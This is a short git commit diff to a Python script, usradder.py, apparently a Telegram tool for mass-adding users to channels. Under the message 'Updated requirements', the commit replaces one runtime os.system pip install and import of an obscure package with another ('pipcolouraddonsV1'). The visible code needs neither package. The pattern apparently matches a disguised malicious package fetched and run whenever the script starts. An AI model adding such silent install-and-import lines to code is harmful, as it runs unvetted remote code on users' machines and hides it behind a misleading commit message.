074fbd18f724e2fccc1bb87db016290522f801e4
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-12 22:07:14 +0200

    Updated requirements

--- usradder.py
+++ usradder.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqliteV1")
-import pythonsqliteV1
+os.system("pip install pipcolouraddonsV1")
+import pipcolouraddonsV1
 from telethon.sync import TelegramClient
 from telethon.tl.types import InputPeerChannel
 from telethon.errors.rpcerrorlist import PeerFloodError, UserPrivacyRestrictedError
